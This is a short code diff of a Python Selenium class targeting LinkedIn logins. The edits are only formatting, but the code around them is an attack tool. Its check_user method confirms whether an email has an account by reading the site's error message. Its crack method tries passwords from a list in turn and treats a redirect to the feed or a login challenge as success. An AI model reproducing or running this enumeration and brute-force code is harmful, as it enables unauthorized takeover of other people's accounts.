@@ -16,7 +16,7 @@ class Linkedin:
 
     def check_user(self):
         self.browser.driver.get(self.url)
-        email = self.browser.wait_until_element_exists('id','username')
+        email = self.browser.wait_until_element_exists('id', 'username')
         email.send_keys(self.username)
         pwd = self.browser.driver.find_element_by_id('password')
         pwd.send_keys('password12345')
@@ -25,7 +25,7 @@ class Linkedin:
             err = self.browser.driver.find_element_by_id('error-for-username')
             if 'we don\'t recognize that email' in err.text:
                 return False
-        except:
+        except BaseException:
             pass
 
         # try to retrieve the full name of account
@@ -37,9 +37,8 @@ class Linkedin:
                 return True
             else:
                 return False
-        except:
+        except BaseException:
             return False
-        
 
     def crack(self):
         passwords = []
@@ -65,7 +64,7 @@ class Linkedin:
             if 'login-challenge' in url or 'feed' in url:
                 found = password
                 break
-                
+
             time.sleep(self.delay)
 
         return found
